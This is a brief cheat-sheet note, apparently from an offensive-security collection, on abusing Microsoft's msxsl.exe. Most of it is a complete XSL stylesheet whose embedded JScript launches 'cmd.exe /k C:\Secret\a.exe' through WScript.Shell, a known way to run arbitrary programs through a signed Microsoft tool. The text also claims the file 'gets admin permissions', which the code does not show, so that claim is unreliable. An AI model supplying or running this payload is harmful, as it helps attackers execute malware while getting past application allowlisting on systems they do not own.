#Microsoft

***

`XSL` files are used to describe how the `XML` files are processed. The syntax is as follows:
`msxsl.exe file.xml script.xsl`

The file below for example gets admin permissions by using an `XSL` file as follows:

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
 
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\Secret\\a.exe");
   return nodelist.nextNode().xml;
 
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```
